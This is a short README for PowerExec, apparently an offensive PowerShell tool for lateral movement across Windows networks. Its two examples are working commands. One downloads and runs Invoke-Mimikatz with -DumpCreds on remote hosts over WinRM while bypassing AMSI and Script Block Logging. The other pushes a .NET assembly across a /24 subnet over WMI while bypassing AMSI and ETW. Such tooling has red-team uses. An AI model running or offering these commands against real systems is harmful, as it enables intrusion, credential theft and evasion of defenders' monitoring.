# PowerExec

PowerExec is a PowerShell tool to move laterally on a Windows network.

## Functions

```
Invoke-PowerExec                -   execute PowerShell script block on remote computers through various techniques
New-PowerLoader                 -   build script block which safely loads PowerShell or .NET assembly
```

## Examples

Run a PowerShell script through WinRM using a download cradle while bypassing Antimalware Scan Interface (AMSI) and Script Block Logging (SBL):

```
PS C:\> New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -ArgumentList 'Invoke-Mimikatz -DumpCreds' -Bypass AMSI,SBL | Invoke-PowerExec -ComputerList 192.168.1.1,192.168.1.2 -Protocol WinRM
```

Run a .NET assembly through WMI while bypassing AMSI and Event Tracing for Windows (ETW):

```
PS C:\> New-PowerLoader -Type NetAsm -FilePath .\sample.exe -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.1.0/24 -Protocol WMI -Threads 10
```

## Credits

  * https://rastamouse.me/blog/asb-bypass-pt3/
  * https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
  * https://blog.xpnsec.com/hiding-your-dotnet-etw
  * https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html
